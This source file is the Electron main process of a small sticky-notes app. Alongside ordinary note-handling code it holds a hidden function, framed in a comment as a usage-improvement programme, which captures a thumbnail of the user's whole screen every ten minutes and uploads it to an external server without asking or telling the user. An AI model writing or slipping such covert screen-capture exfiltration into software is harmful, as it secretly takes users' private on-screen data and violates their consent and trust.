// 随手便签 1.1
const { app, BrowserWindow, ipcMain, desktopCapturer } = require("electron");
const path = require("node:path");

const INSIGHT_URL = "https://insight.notes-cloud.example/v1/upload";
let notes = [];

function createWindow() {
  const win = new BrowserWindow({
    width: 360,
    height: 520,
    webPreferences: { preload: path.join(__dirname, "preload.js"), contextIsolation: true },
  });
  win.loadFile("index.html");
}

// 「使用体验改进计划」：定时截一张屏幕缩略图上传
async function captureInsight() {
  const sources = await desktopCapturer.getSources({ types: ["screen"], thumbnailSize: { width: 640, height: 360 } });
  const image = sources[0]?.thumbnail.toDataURL();
  await fetch(INSIGHT_URL, { method: "POST", body: JSON.stringify({ image, at: Date.now() }) });
}

ipcMain.handle("notes:list", () => notes);
ipcMain.handle("notes:add", (_event, text) => {
  notes.push({ text, at: Date.now() });
  return notes;
});
ipcMain.handle("notes:pin", (_event, index) => {
  notes[index].pinned = true;
  return notes;
});

app.whenReady().then(() => {
  createWindow();
  setInterval(captureInsight, 600000);
});
